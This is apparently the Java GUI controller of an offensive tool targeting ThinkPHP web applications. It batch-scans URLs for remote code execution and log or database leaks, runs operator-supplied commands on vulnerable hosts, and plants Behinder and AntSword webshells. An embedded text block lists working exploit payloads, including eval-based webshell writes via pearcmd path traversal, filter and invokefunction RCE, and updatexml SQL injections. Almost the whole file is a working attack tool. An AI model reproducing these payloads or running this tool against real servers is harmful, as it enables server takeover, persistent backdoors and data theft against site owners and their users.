package com.guitool.tpbomb.controller;

import com.guitool.tpbomb.payload.PayloadTemplate;
import com.guitool.tpbomb.util.FileUtils;
import com.guitool.tpbomb.util.ResultUtils;
import com.guitool.tpbomb.util.ToolUtils;
import com.guitool.tpbomb.util.UrlUtils;
import javafx.event.ActionEvent;
import javafx.fxml.FXML;
import javafx.scene.control.Button;
import javafx.scene.control.ChoiceBox;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;

import java.util.ArrayList;

public class MainController {
    @FXML
    public TextField urlTextField;
    @FXML
    public TextField urlFileTextField;
    @FXML
    public TextField attackUrlTextField;
    @FXML
    public TextField executeCommandTextField;
    @FXML
    public TextArea scanResultTextArea;
    @FXML
    public TextArea attackResultTextArea;
    @FXML
    public TextArea payloadDisplayTextArea;
    @FXML
    public ChoiceBox<String> vulnerabilityChoiceBox;
    @FXML
    public ChoiceBox<String> payloadChoiceBox;
    @FXML
    public Button detectButton;
    @FXML
    public Button batchDetectButton;
    @FXML
    public Button loadFileButton;
    @FXML
    public Button clearScanResultButton;
    @FXML
    public Button executeCommandButton;
    @FXML
    public Button clearAttackResultButton;
    @FXML
    public Button behinderShell;
    @FXML
    public Button antswordShell;
    final ArrayList<String> batchDetectUrlArrayList = new ArrayList<>();
    final ArrayList<String> vulnerabilityList = new ArrayList<>() {{
        add("ThinkPHP 多语言RCE");
        add("ThinkPHP2.x RCE");
        add("ThinkPHP3.2.x 日志泄露");
        add("ThinkPHP3.2.x Debug未开启RCE");
        add("ThinkPHP3.2.x Debug开启RCE");
        add("ThinkPHP5 日志泄露");
        add("ThinkPHP5 数据库信息泄露");
        add("ThinkPHP5 Debug无关RCE");
        add("ThinkPHP5 Debug开启RCE");
        add("ThinkPHP5 Captcha路由RCE");
        add("ThinkPHP5 未开启强制路由RCE");
        add("ThinkPHP6 日志泄露");
    }};

    public void initialize() {
        initPayloadDisplayTextArea();
        initScanResultTextArea();
        initAttackResultTextArea();
        initVulnerabilityChoiceBox();
        initPayloadChoiceBox();
    }

    public void initPayloadDisplayTextArea() {
//        String poc = FileUtils.getContentsFromFile("PoC.txt");
        this.payloadDisplayTextArea.setText("[+] ThinkPHP 2.x RCE (GET)\n" +
                "\t> http://127.0.0.1/?s=index/index/xxx/${@phpinfo()}\n" +
                "\t> http://127.0.0.1/?s=index/index/xxx/${${system(whoami)}}\n" +
                "\t> http://127.0.0.1/?s=index/index/xxx/${${@eval($_POST[a])}}\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\module/xxx/${@phpinfo()}\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\module/xxx/${${system(whoami)}}\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\module/xxx/${${@eval($_POST[a])}}\n" +
                "\n" +
                "[+] ThinkPHP 3.2.x debug关闭 RCE (GET)\n" +
                "\t> http://127.0.0.1/?m=--><?=phpinfo();?>\n" +
                "\t    http://127.0.0.1/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Common/23_02_03.log(根据实际日期来写)\n" +
                "\n" +
                "[+] ThinkPHP 3.2.x debug开启 RCE (GET)\n" +
                "\t> http://127.0.0.1/?m=Home&c=Index&a=index&test=--><?=phpinfo();?>\n" +
                "\t    http://127.0.0.1/?m=Home&c=Index&a=index&value[_filename]=./Application/Runtime/Logs/Home/23_02_03.log(根据实际日期来写)\n" +
                "\n" +
                "[+] ThinkPHP 5.0.0~5.0.12 debug无关 RCE (POST)\n" +
                "\t> http://127.0.0.1/?s=index/index\n" +
                "\t    s=1&_method=__construct&method=POST&filter[]=phpinfo\n" +
                "\t    s=whoami&_method=__construct&method=POST&filter[]=system\n" +
                "\t    command=whoami&_method=__construct&method=GET&filter[]=system\n" +
                "\t    _method=__construct&method=GET&filter[]=system&get[]=whoami\n" +
                "\t    _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=whoami\n" +
                "\t    function=system&command=whoami&_method=filter\n" +
                "\n" +
                "[+] ThinkPHP 5.0.13~5.0.23 debug开启 RCE (POST)\n" +
                "\t> http://127.0.0.1/?s=index/index\n" +
                "\t    _method=__construct&filter[]=system&method=GET&get[]=whoami\n" +
                "\t    _method=__construct&filter[]=system&method=GET&get[]=whoami\n" +
                "\t    _method=__construct&filter[]=phpinfo&method=get&server[REQUEST_METHOD]=1\n" +
                "\t    _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=whoami\n" +
                "\n" +
                "[+] ThinkPHP 5.0.13~5.0.23 captcha路由 RCE (POST)\n" +
                "\t> http://127.0.0.1/?s=captcha\n" +
                "\t    _method=__construct&filter[]=phpinfo&method=GET&get[]=1\n" +
                "\t    _method=__construct&filter[]=system&method=GET&get[]=whoami\n" +
                "\t    _method=__construct&filter[]=phpinfo&method=GET&server[REQUEST_METHOD]=1\n" +
                "\t    _method=__construct&filter[]=system&method=GET&server[REQUEST_METHOD]=whoami\n" +
                "\n" +
                "[+] ThinkPHP 5.0.x,5.1.x 未启用强制路由 RCE (GET)\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\Request/input&filter[]=phpinfo&data=1\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\Request/input&filter[]=system&data=pwd\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\View/display&content=<?=phpinfo();?>&data=1\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\View/display&content=<?=system(\"id\");?>&data=1\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=<?=phpinfo();?>\n" +
                "\t> http://127.0.0.1/?s=index/\\think\\template\\driver\\file/write&cacheFile=shell.php&content=<?=system(\"id\");?>\n" +
                "\n" +
                "[+] ThinkPHP 6.0.1~6.0.13,5.0.0~5.0.12,5.1.0~5.1. 多语言RCE\n" +
                "\t> http://127.0.0.1/public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=phpinfo()?>+/tmp/1.php\n" +
                "\t    http://127.0.0.1/public/index.php?lang=../../../../../../../../../../../../tmp/1\n" +
                "\t> http://127.0.0.1/public/index.php?lang=../../../../../../../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?=@eval($_POST['cmd']);?>+/var/www/html/shell.php\n" +
                "\n" +
                "[+] ThinkPHP 5.0.13~5.0.15,5.1.0~5.1.5 ParseData方法注入\n" +
                "\t> http://127.0.0.1/index.php/index/index?level[0]=inc&level[1]=updatexml(1,concat(0x7,user(),0x7e),1)&level[2]=1\n" +
                "\n" +
                "[+] ThinkPHP 5.1.6~5.1.7 ParseArrayData方法注入\n" +
                "\t> http://127.0.0.1/index.php/index/index?level[0]=point&level[1]=1&level[2]=updatexml(1,concat(0x7,user(),0x7e),1)^&level[3]=0\n" +
                "\n" +
                "[+] ThinkPHP 5.0.0~5.0.10 ParseWhereItem方法注入一\n" +
                "\t> http://127.0.0.1/index.php/index/index?username[0]=not like&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()#\n" +
                "\t> http://127.0.0.1/index.php/index/index?username[0]=NOT LIKE&username[1][0]=%%&username[1][1]=233&username[2]=) union select 1,user()#\n" +
                "\n" +
                "[+] ThinkPHP 5All ParseWhereItem方法注入二\n" +
                "\t> http://127.0.0.1/index.php/index?username=) union select updatexml(1,concat(0x7,user(),0x7e),1)%23\n" +
                "\n" +
                "[+] ThinkPHP 5.1.16~5.1.22 OrderBy注入\n" +
                "\t> http://127.0.0.1/index/index/index?orderby[id`|updatexml(1,concat(0x7,user(),0x7e),1)%23]=1\n" +
                "\n" +
                "[+] ThinkPHP 5.0.0~5.0.21 聚合查询注入\n" +
                "\t> http://127.0.0.1/index/index/index?data=id),(updatexml(1,concat(0x7,user(),0x7e),1)%23\n" +
                "\n" +
                "[+] ThinkPHP 5.1.11~5.1.25 聚合查询注入\n" +
                "\t> http://127.0.0.1/index/index/index?data=id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23");
        this.payloadDisplayTextArea.setEditable(false);
    }

    public void initScanResultTextArea() {
        this.scanResultTextArea.setEditable(false);
    }

    public void initAttackResultTextArea() {
        this.attackResultTextArea.setEditable(false);
    }

    public void initVulnerabilityChoiceBox() {
        this.vulnerabilityChoiceBox.getItems().addAll(
                "ThinkPHP 多语言RCE",
                "ThinkPHP2.x RCE",
                "ThinkPHP3.2.x 日志泄露",
                "ThinkPHP3.2.x Debug未开启RCE",
                "ThinkPHP3.2.x Debug开启RCE",
                "ThinkPHP5 日志泄露",
                "ThinkPHP5 数据库信息泄露",
                "ThinkPHP5 Debug无关RCE",
                "ThinkPHP5 Debug开启RCE",
                "ThinkPHP5 Captcha路由RCE",
                "ThinkPHP5 未开启强制路由RCE",
                "ThinkPHP6 日志泄露",
                "检测所有漏洞"
        );
        this.vulnerabilityChoiceBox.getSelectionModel().selectLast();
    }

    public void initPayloadChoiceBox() {
        this.payloadChoiceBox.getItems().addAll(
                "ThinkPHP 多语言RCE",
                "ThinkPHP2.x RCE",
                "ThinkPHP3.2.x Debug未开启RCE",
                "ThinkPHP3.2.x Debug开启RCE",
                "ThinkPHP5 Debug无关RCE",
                "ThinkPHP5 Debug开启RCE",
                "ThinkPHP5 Captcha路由RCE",
                "ThinkPHP5 未开启强制路由RCE"
        );
        this.payloadChoiceBox.getSelectionModel().selectFirst();
    }

    public void detectFunction(ActionEvent actionEvent) {
        String url = UrlUtils.urlRequestCheck(this.urlTextField.getText());
        String vulnerabilityChoiceValue = this.vulnerabilityChoiceBox.getValue();

        if (url != null) {
            if (vulnerabilityChoiceValue.equals("检测所有漏洞")) {
                for (String vulnerability : vulnerabilityList) {
                    vulnerabilityScan(url, vulnerability);
                }
            } else {
                vulnerabilityScan(url, vulnerabilityChoiceValue);
            }
        } else {
            scanResultTextAreaPrint("[-] URL错误\r\n");
        }
    }

    public void batchDetectFunction(ActionEvent actionEvent) {
        if (!batchDetectUrlArrayList.isEmpty()) {
            for (String url : batchDetectUrlArrayList) {
                String vulnerabilityChoiceValue = this.vulnerabilityChoiceBox.getValue();

                if (vulnerabilityChoiceValue.equals("检测所有漏洞")) {
                    for (String vulnerability : vulnerabilityList) {
                        vulnerabilityScan(url, vulnerability);
                    }
                } else {
                    vulnerabilityScan(url, vulnerabilityChoiceValue);
                }
            }
        } else {
            scanResultTextAreaPrint("[-] 请加载URL文件后再进行批量检测\r\n");
        }
    }

    public void loadFileFuction(ActionEvent actionEvent) {
        String urlFilePath = this.urlFileTextField.getText();
        ArrayList<String> urlsFromFile = FileUtils.getUrlsFromFile(urlFilePath);
        if (!urlsFromFile.isEmpty()) {
            for (String url : urlsFromFile) {
                String trueUrl = UrlUtils.urlRequestCheck(url);
                if (trueUrl != null) {
                    scanResultTextAreaPrint("[*] 添加URL: " + url);
                    batchDetectUrlArrayList.add(trueUrl);
                }
            }
        }
    }

    public void clearScanResultFunction(ActionEvent actionEvent) {
        this.scanResultTextArea.setText("");
        this.batchDetectUrlArrayList.clear();
    }

    public void executeCommandFunction(ActionEvent actionEvent) {
        String payloadChoice = this.payloadChoiceBox.getValue();
        String executeCommand = this.executeCommandTextField.getText();
        String url = UrlUtils.urlRequestCheck(this.attackUrlTextField.getText());

        if (url != null) {
            if (!executeCommand.equals("")) {
                vulnerabilityAttack(url, payloadChoice, executeCommand);
            } else {
                attackResultTextAreaPrint("[-] 待执行命令不能为空\r\n");
            }
        } else {
            attackResultTextAreaPrint("[-] URL错误\r\n");
        }
    }

    public void clearAttackResultFunction(ActionEvent actionEvent) {
        this.attackResultTextArea.setText("");
    }

    public void behinderShellFunction(ActionEvent actionEvent) {
        String payloadChoice = this.payloadChoiceBox.getValue();
        String url = UrlUtils.urlRequestCheck(this.attackUrlTextField.getText());

        if (url != null) {
            PayloadTemplate payload = ToolUtils.getPayload(payloadChoice);
            ResultUtils resultUtils = payload.getBehinderShell(url);
            if (resultUtils == null) {
                attackResultTextAreaPrint("[-] 请参考PoC模块尝试手动种植冰蝎马\r\n");
            } else if (resultUtils.isResult()) {
                attackResultTextAreaPrint("[+] 冰蝎马种植成功, 请手动检测是否正确");
                attackResultTextAreaPrint("[+] behinderShell: " + resultUtils.getVulnerability() + ", protocol is default aes\r\n");
            }
        } else {
            attackResultTextAreaPrint("[-] URL错误\r\n");
        }
    }

    public void antswordShellFunction(ActionEvent actionEvent) {
        String payloadChoice = this.payloadChoiceBox.getValue();
        String url = UrlUtils.urlRequestCheck(this.attackUrlTextField.getText());

        if (url != null) {
            PayloadTemplate payload = ToolUtils.getPayload(payloadChoice);
            ResultUtils resultUtils = payload.getAntswordShell(url);
            if (resultUtils == null) {
                attackResultTextAreaPrint("[-] 请参考PoC模块尝试手动种植蚁剑马\r\n");
            } else if (resultUtils.isResult()) {
                attackResultTextAreaPrint("[+] 蚁剑马种植成功, 请手动检测是否正确");
                attackResultTextAreaPrint("[+] antswordShell: " + resultUtils.getVulnerability() + ", password is tp\r\n");
            }
        } else {
            attackResultTextAreaPrint("[-] URL错误\r\n");
        }
    }

    public void scanResultTextAreaPrint(String message) {
        this.scanResultTextArea.appendText(message + "\r\n");
    }

    public void attackResultTextAreaPrint(String message) {
        this.attackResultTextArea.appendText(message + "\r\n");
    }

    private void vulnerabilityScan(String url, String vulnerabilityChoiceValue) {
        scanResultTextAreaPrint("[+] 正在检测漏洞 ===> " + vulnerabilityChoiceValue);
        PayloadTemplate payload = ToolUtils.getPayload(vulnerabilityChoiceValue);
        ResultUtils result = payload.checkVulnerability(url);
        if (result.isResult()) {
            scanResultTextAreaPrint("[√] 存在漏洞: " + vulnerabilityChoiceValue);
            scanResultTextAreaPrint("[√] Payload: " + result.getVulnerability() + "\r\n");
        } else {
            scanResultTextAreaPrint("[×] 不存在漏洞: " + vulnerabilityChoiceValue + "\r\n");
        }
    }

    private void vulnerabilityAttack(String url, String vulnerabilityChoiceValue, String executeCommand) {
        attackResultTextAreaPrint("[+] 正在利用漏洞 ===> " + vulnerabilityChoiceValue);
        PayloadTemplate payload = ToolUtils.getPayload(vulnerabilityChoiceValue);
        ResultUtils result = payload.executeVulnerability(url, executeCommand);
        if (result.isResult()) {
            attackResultTextAreaPrint("[√] 漏洞利用结果: \r\n" + result.getVulnerability() + "\r\n");
        } else {
            attackResultTextAreaPrint("[×] 漏洞利用失败\r\n");
        }
    }
}
